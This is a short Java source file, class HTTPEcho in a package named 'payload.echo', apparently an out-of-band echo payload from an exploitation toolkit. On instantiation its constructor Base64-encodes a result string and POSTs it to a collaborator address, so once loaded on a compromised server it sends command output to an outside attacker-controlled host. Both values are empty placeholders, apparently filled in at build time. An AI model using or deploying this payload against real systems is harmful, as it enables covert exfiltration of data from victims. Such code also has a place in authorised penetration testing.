package payload.echo;

import util.Option;

import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class HTTPEcho {
    String result;
    String collabAddress;

    public HTTPEcho() {
        try {
            result = "";
            collabAddress = "";
            exec();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void exec() throws Exception {
        echo();
    }

    private void echo() {
        try {
            URL url = new URL(collabAddress);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.connect();

            result = Base64.getEncoder().encodeToString(this.result.getBytes());

            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream()));
            writer.write(result);
            writer.close();

            if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                System.out.println("OK");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
